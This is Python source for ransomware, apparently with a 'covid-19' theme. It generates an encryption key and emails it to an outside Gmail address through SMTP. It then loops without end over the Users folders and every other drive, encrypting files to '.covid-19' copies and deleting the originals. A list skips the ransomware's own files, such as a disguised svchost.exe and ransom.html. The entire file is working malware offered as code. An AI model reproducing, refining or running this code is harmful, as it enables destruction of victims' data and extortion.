#!/usr/bin/python
#coding:utf-8
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
import os, sys, base64, smtplib

""" THIS FILE IS PART OF THE FINAL EXECUTABLES """

# GET THE ENVIRONMENT VARIABLE
letter_drive = os.environ["SystemDrive"]
current_user = os.environ["USERNAME"]

# PATH TO WRITE THE NEW KEY AFTER REBOOT
usrkey = "{}\\Users\\{}\\{}.key".format(letter_drive, current_user, current_user)

# GENERATE KEY FUNCTION
def genkey(name):
    global key
    key = Fernet.generate_key()
    with open(usrkey, "wb") as file:
        file.write(key)

# FILE ENCRYPTING FUNCTION
def file_encrypt(key, name):
    with open(name,'rb') as files:
        data = files.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    encrypted_file = name + ".covid-19"
    try:
        with open(encrypted_file, 'wb') as files:
            files.write(encrypted)

        os.remove(name)
    except:
        pass

# CALL FUNCTION TO GENERATE KEY
genkey(current_user)

# SET DESTINATOR AND THE SENDER
fromaddr = "FROM_TO@gmail.com"
toaddr = "DEST_TO@gmail.com"

# FUNCTION TO PREPARE THE MAIL
def send_key():
    try:
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "The second key generate by the reboot of system"
        body = "The server you sending a key from the client, the script encrypted her files with this key."
        msg.attach(MIMEText(body, 'plain'))
        filename = "{}.key".format(usrkey)
        attachment = open(filename, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, "YOUR_PASS_HERE")
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
    except IOError:
        pass
    except smtplib.SMTPAuthenticationError:
        print("[!] Login or pass failed")
        pass

# CALL THE FUNCTION TO SEND THE MAIL
send_key()

# ADD ALL LETTER FOR POSSIBLE DRIVES
all_drives = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
drives     = []

# FOR EVERYTIME ENCRYPTING FILES ON THE SYSTEM
while True:
    # LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
    rep = ['\\Users\\']
    for user in rep:
        for root, dirs, files in os.walk(user):
            for file in files:
                my_files = ["GuiCounter.exe", "svchost.exe", "image.jpg", "windows-installer.ico", \
                "crypt_init.exe", "vcruntime140.dll", "python37.dll", "python3.dll", "ransom.html", \
                "tk86t.dll", "tcl86t.dll", "library.zip", "tclIndex" ]
                if not(file in my_files):
                    for ext in file.split("."):
                        if(file.endswith(ext)):
                            my_ext = ["pyc", "pyd", "tcl", "h", "msg", "enc", "covid-19"]
                            if not(ext in my_ext):
                                try:
                                    full_path = os.path.join(root, file)
                                    file_encrypt(key, full_path)
                                except PermissionError:
                                    pass
                                except:
                                    pass
                                
    # GET THE LETTER OF EVERY DISK INTO THE SYSTEM
    for letter in all_drives:
        if os.path.isdir(letter + ':\\'):
            drives.append(letter + ":")
    # ADD PATH TO ENCRYPT OF EVERY DISK INTO THE SYSTEM
    for drive in drives:
        rep = ["{}\\Users\\".format(drive)]
        if drive != letter_drive:
            rep.append(drive + "\\")
            for letter in rep:
                for root, dir, files in os.walk(letter):
                    for file in files:
                        for ext in file.split("."):
                            if file.endswith(ext):
                                my_ext = ["covid-19"]
                                if not(ext in my_ext):
                                    try:
                                        full_path = os.path.join(root, file)
                                        file_encrypt(key, full_path)
                                    except PermissionError:
                                        pass
                                    except:
                                        pass
